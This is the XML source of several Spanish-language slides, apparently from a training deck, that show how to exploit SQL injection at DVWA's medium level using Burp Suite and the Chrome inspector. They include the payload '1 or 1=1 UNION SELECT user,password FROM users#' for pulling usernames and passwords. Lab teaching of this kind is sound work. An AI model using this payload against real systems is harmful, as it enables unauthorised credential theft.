          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2647045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8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – Nivel medio con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="CuadroTexto 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5C2D799-6DEB-6CCD-B83A-EFA8A4B1F22B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344056" y="1259768"/>
            <a:ext cx="10525048" cy="2308324"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Cambiamos el valor del “id=1” por “id=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>1 or 1=1 UNION SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>user,password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> FROM users#”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>A continuación lo codificamos (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>encode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> URL)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Tendremos el siguiente resultado</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:highlight>
                <a:srgbClr val="FFFFFF"/>
              </a:highlight>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Y apretamos botón de “</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>send</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{27347457-32B9-B7A6-6CCF-7658A4857760}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6623604" y="1552155"/>
            <a:ext cx="4960673" cy="2543718"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Imagen 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B3F44AB9-3E00-12C5-3833-89CCECD21FDA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3783930" y="2997181"/>
            <a:ext cx="1771897" cy="1086002"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Imagen 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{278F4B12-547C-95D5-D48D-2B61224ADCE9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1515664" y="2395230"/>
            <a:ext cx="4401164" cy="495369"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3302575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4056" y="66110"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – Nivel medio con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="CuadroTexto 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{39AAA9E0-DFBA-85CE-C16D-266987529A49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344056" y="848747"/>
            <a:ext cx="10525048" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>En la sección de respuesta veremos el resultado</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0398D015-FF7C-BE41-5847-F3597011550E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2867249" y="1423447"/>
            <a:ext cx="7414029" cy="5236848"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2157736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4056" y="66110"/>
            <a:ext cx="10525048" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – Nivel medio con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inspeccionar</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="CuadroTexto 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{39AAA9E0-DFBA-85CE-C16D-266987529A49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344056" y="848747"/>
            <a:ext cx="10525048" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Veamos ahora cómo atacar usando el propio navegado (Chrome, en este caso) la opción “inspeccionar”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Presione F12 (tal vez necesite usar extensiones de Chrome – "HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>header</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Live" es una de ellas)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Imagen 2" descr="Interfaz de usuario gráfica, Texto, Aplicación, Correo electrónico&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{30E34093-412F-0715-D660-8566D664DC9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="676275" y="1631384"/>
            <a:ext cx="3524250" cy="2377440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="CuadroTexto 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5C55C53-43E0-D054-419E-06ACD95EA11A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="596246" y="4274211"/>
            <a:ext cx="3604279" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" dirty="0"/>
              <a:t>Identificamos el elemento con el que estamos trabajando</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Imagen 7" descr="Interfaz de usuario gráfica, Texto, Aplicación, Chat o mensaje de texto&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D693687E-2F90-BB47-ABD2-998666620168}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4461209" y="3222377"/>
            <a:ext cx="7328502" cy="3216130"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2578737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4056" y="66110"/>
            <a:ext cx="10525048" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="es-ES" altLang="es-ES" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DVWA: inyección SQL ataque – Nivel medio con </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="es-ES" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>inspeccionar</a:t>
            </a:r>
            <a:endParaRPr lang="es-ES" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C0"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="CuadroTexto 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{39AAA9E0-DFBA-85CE-C16D-266987529A49}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="344056" y="848747"/>
            <a:ext cx="10525048" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Y cambiamos el valor "1" por "1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>or</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 1 = 1 UNION SELECT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>user,password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="es-ES" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:highlight>
                  <a:srgbClr val="FFFFFF"/>
                </a:highlight>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> FROM users#"</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Imagen 4" descr="Interfaz de usuario gráfica, Texto, Aplicación&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B3247C17-860F-0E7E-3197-5A383CA05C59}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="344056" y="1285707"/>
            <a:ext cx="6302286" cy="2692404"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Imagen 5" descr="Interfaz de usuario gráfica, Texto, Aplicación&#10;&#10;Descripción generada automáticamente">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6555F6D0-5E4A-9BAF-4BFF-74640BBAC93F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6511945" y="3214541"/>
            <a:ext cx="5335999" cy="3345788"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="29896177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4056" y="66110"/>
            <a:ext cx="8264525" cy="782637"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
